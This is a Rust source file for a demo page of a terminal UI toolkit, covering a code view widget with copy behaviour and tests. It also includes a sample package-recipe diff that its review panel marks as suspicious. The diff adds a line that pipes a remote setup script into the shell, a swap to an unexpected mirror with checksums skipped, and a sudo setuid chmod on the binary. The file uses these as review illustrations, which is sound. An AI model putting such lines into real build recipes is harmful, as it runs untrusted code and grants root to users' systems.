//! Code view: highlighted Rust and TOML, line numbers, copying with `c`, and selecting code with
//! the mouse, whose clean copy leaves the line numbers out. A recipe review shows a shell script
//! as a diff, tints its findings and goes to a line.

use qframe::prelude::*;
use qframe::widgets::{CodeView, Language, LineMark, LineTone, NumberInput, ScrollView};

use super::{PageMsg, setting, toggle};
use crate::app::Msg as AppMsg;
use crate::log::EventLog;

const PAGE: &str = "code-view";

/// A Rust sample.
const RUST: &str = r#"#[derive(Debug, Clone)]
enum Msg {
    Save,
}

fn update(app: &mut App, msg: Msg) -> Command<Msg> {
    match msg {
        Msg::Save => Command::perform(|| store::save("notes.md")),
    }
}"#;

/// A TOML sample.
const TOML: &str = r##"[meta]
name = "Aurora"
extends = "monochrome"

[colors]
accent = "#7DD3FC"   # sky

[style."button:focus"]
bg = "pulse($accent, $accent-2)""##;

/// A package recipe compared with the version approved before, one line each: `+` added, `-`
/// removed, a space unchanged.
const PKGBUILD: &str = r#"  # Maintainer: Ada <ada at example dot org>
  pkgname=hello-cli
- pkgver=1.4.1
+ pkgver=1.5.0
  pkgrel=1
  pkgdesc="A friendly greeting for the terminal"
  arch=('x86_64')
  license=('MIT')
  makedepends=('cargo')
  install=hello-cli.install
- source=("$pkgname-$pkgver.tar.gz::https://example.org/hello/v$pkgver.tar.gz")
+ source=("$pkgname-$pkgver.tar.gz::https://mirror.example.net/hello/v$pkgver.tar.gz")
  sha256sums=('SKIP')
 
  prepare() {
    cd "$pkgname-$pkgver"
    cargo fetch --locked --target "$(rustc -vV | sed -n 's/host: //p')"
  }
 
  build() {
    cd "$pkgname-$pkgver"
+   curl -fsSL https://mirror.example.net/setup.sh | sh
    export RUSTUP_TOOLCHAIN=stable
    cargo build --frozen --release
  }
 
  package() {
    cd "$pkgname-$pkgver"
    install -Dm755 "target/release/$pkgname" "$pkgdir/usr/bin/$pkgname"
+   sudo chmod u+s "$pkgdir/usr/bin/$pkgname"
    install -Dm644 /dev/stdin "$pkgdir/usr/share/doc/$pkgname/README" <<'EOF'
  Run hello-cli with a name to greet.
  EOF
  }"#;

/// What a review of the recipe points at: the locale key of the finding and a text on its line.
const FINDINGS: [(&str, &str); 3] = [
    ("code-view.finding-host", "mirror.example.net/hello"),
    ("code-view.finding-download", "| sh"),
    ("code-view.finding-root", "sudo"),
];

/// The recipe's text and the mark of each of its lines.
fn recipe() -> (String, Vec<LineMark>) {
    let mut text = Vec::new();
    let mut marks = Vec::new();
    for line in PKGBUILD.lines() {
        let (mark, code) = line.split_at(line.len().min(2));
        marks.push(match mark {
            "+ " => LineMark::Added,
            "- " => LineMark::Removed,
            _ => LineMark::Unchanged,
        });
        text.push(code);
    }
    (text.join("\n"), marks)
}

/// The line, counted from 1, of the first line of the recipe that contains `needle`.
fn line_of(text: &str, needle: &str) -> usize {
    text.lines().position(|line| line.contains(needle)).map_or(1, |index| index + 1)
}

/// Playground settings.
#[derive(Debug)]
pub struct State {
    numbers: bool,
    selectable: bool,
    marks: bool,
    reveal: Option<usize>,
}

impl Default for State {
    fn default() -> Self {
        Self { numbers: true, selectable: true, marks: true, reveal: None }
    }
}

/// Demo messages.
#[derive(Debug, Clone, Copy)]
pub enum Msg {
    Numbers(bool),
    Selectable(bool),
    Marks(bool),
    Reveal(usize),
    Copied(&'static str),
}

fn send(message: Msg) -> AppMsg {
    AppMsg::Page(PageMsg::CodeView(message))
}

/// Applies a demo message.
pub fn update(state: &mut State, message: Msg, log: &mut EventLog) -> Command<AppMsg> {
    match message {
        Msg::Numbers(on) => {
            state.numbers = on;
            log.push(PAGE, "Playground", format!("line_numbers = {on}"));
        }
        Msg::Selectable(on) => {
            state.selectable = on;
            log.push(PAGE, "Playground", format!("selectable = {on}"));
        }
        Msg::Marks(on) => {
            state.marks = on;
            log.push(PAGE, "Playground", format!("line_marks = {on}"));
        }
        Msg::Reveal(line) => {
            state.reveal = Some(line);
            log.push(PAGE, "CodeView#pkgbuild", format!("reveal({line})"));
        }
        Msg::Copied(id) => log.push(PAGE, format!("CodeView#{id}"), "copied"),
    }
    Command::none()
}

/// The live demo.
pub fn view(state: &State, ui: &mut View<'_, AppMsg>) {
    ui.add_with(Panel::new().title(t!("demo.live")), |ui| {
        ui.add(Text::new(t!("code-view.hint")).role("secondary"));
        // region: rust
        // A code view is selectable by itself; `.selectable(false)` turns that off.
        ui.add(CodeView::new(RUST, Language::Rust).line_numbers(state.numbers).on_copy(send(Msg::Copied("rust"))))
            .fill_width()
            .selectable(state.selectable)
            .id("rust");
        // endregion
        ui.add(CodeView::new(TOML, Language::Toml).line_numbers(state.numbers).on_copy(send(Msg::Copied("toml"))))
            .fill_width()
            .selectable(state.selectable)
            .id("toml");
    })
    .fill_width();

    ui.add_with(Panel::new().title(t!("code-view.review")), |ui| {
        ui.add(Text::new(t!("code-view.review-hint")).role("secondary"));
        let (text, marks) = recipe();
        // region: review
        // Each finding is a warning tint with its sign; pressing one goes to its line.
        for (index, (key, needle)) in FINDINGS.iter().enumerate() {
            let line = line_of(&text, needle);
            ui.add(Button::new(t!(key, line = line)).on_press(send(Msg::Reveal(line)))).id(format!("finding-{index}"));
        }
        let mut code = CodeView::new(text.as_str(), Language::from_file_name("PKGBUILD"))
            .line_numbers(state.numbers)
            .on_copy(send(Msg::Copied("pkgbuild")));
        if state.marks {
            code = code.line_marks(marks);
        }
        for (_, needle) in FINDINGS {
            let line = line_of(&text, needle);
            code = code.highlight_lines(line..=line, LineTone::Warning);
        }
        // The line gone to is the accent tone, over its finding's warning.
        if let Some(line) = state.reveal {
            code = code.reveal(line).highlight_lines(line..=line, LineTone::Accent);
        }
        ui.add_with(ScrollView::new(), |ui| {
            ui.add(code).fill_width().selectable(state.selectable).id("pkgbuild");
        })
        .width(Length::Fill(1))
        .height(Length::Cells(12))
        .id("recipe");
        // endregion
    })
    .fill_width();

    ui.add_with(Panel::new().title(t!("demo.playground")).gap(0), |ui| {
        setting(ui, t!("code-view.numbers"), |ui| {
            ui.add(toggle(state.numbers, |on| send(Msg::Numbers(on)))).id("numbers");
        });
        ui.spacer().height(Length::Cells(1));
        setting(ui, t!("text.selectable"), |ui| {
            ui.add(toggle(state.selectable, |on| send(Msg::Selectable(on)))).id("selectable");
        });
        ui.spacer().height(Length::Cells(1));
        setting(ui, t!("code-view.marks"), |ui| {
            ui.add(toggle(state.marks, |on| send(Msg::Marks(on)))).id("marks");
        });
        ui.spacer().height(Length::Cells(1));
        // region: go-to-line
        setting(ui, t!("code-view.go-to-line"), |ui| {
            let lines = PKGBUILD.lines().count();
            let field = NumberInput::new(state.reveal.unwrap_or(1) as f64)
                .range(1.0, lines as f64)
                .steppers(true)
                .on_change(|value| send(Msg::Reveal(value.round().max(1.0) as usize)));
            ui.add(field).width(Length::Cells(16)).id("go-to-line");
        });
        // endregion
    })
    .fill_width();
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::tests::showcase_on;

    #[test]
    fn selecting_code_copies_it_without_line_numbers_unless_raw() {
        use qframe::event::{MouseButton, MouseKind};

        let mut h = showcase_on(PAGE);
        h.set_reduced_motion(true);
        let (x, y) = h.find("enum Msg {").expect("code on screen");
        let (gutter, _) = h.find("2  enum").expect("line number on screen");
        h.drag((gutter, y), (x + 9, y + 1));
        h.mouse(MouseKind::Down(MouseButton::Right), x, y).mouse(MouseKind::Up(MouseButton::Right), x, y);
        crate::tests::click_text_below(&mut h, "Copy", y);
        assert_eq!(h.clipboard(), Some("enum Msg {\n    Save,"), "no line numbers");
        h.mouse(MouseKind::Down(MouseButton::Right), x, y).mouse(MouseKind::Up(MouseButton::Right), x, y);
        crate::tests::click_text_below(&mut h, "Raw copy", y);
        let raw = h.clipboard().unwrap_or_default().to_owned();
        assert!(raw.starts_with("2  enum Msg {") && raw.contains("3      Save,"), "{raw:?}");
        let log = h.app().log.recent(PAGE, 10);
        assert!(log.iter().any(|entry| entry.message == "copied 20 characters"), "{log:?}");
        h.send(send(Msg::Selectable(false)));
        h.drag((x, y), (x + 3, y)).press("ctrl+c");
        assert_eq!(h.clipboard(), Some(raw.as_str()), "selection turned off");
    }

    #[test]
    fn a_finding_goes_to_its_line_in_the_recipe() {
        let mut h = crate::tests::showcase_tall(crate::app::Showcase::new(), PAGE, 90);
        h.set_reduced_motion(true);
        let (text, marks) = recipe();
        assert_eq!(marks.iter().filter(|mark| **mark == LineMark::Added).count(), 4);
        assert_eq!(marks.iter().filter(|mark| **mark == LineMark::Removed).count(), 2);
        let sudo = line_of(&text, "sudo");
        let label = format!("Line {sudo}: asks for root");
        let (x, y) = h.find(&label).expect("the finding is on screen");
        h.click(x, y);
        assert_eq!(h.app().pages.code_view.reveal, Some(sudo));
        assert!(h.screen().contains("sudo chmod u+s"), "{}", h.screen());
        h.send(send(Msg::Reveal(1)));
        assert!(h.screen().contains("# Maintainer"), "{}", h.screen());
    }

    #[test]
    fn copies_and_hides_numbers() {
        let mut h = showcase_on(PAGE);
        assert!(h.screen().contains("Aurora"));
        h.send(send(Msg::Numbers(false)));
        assert!(!h.app().pages.code_view.numbers);
    }
}
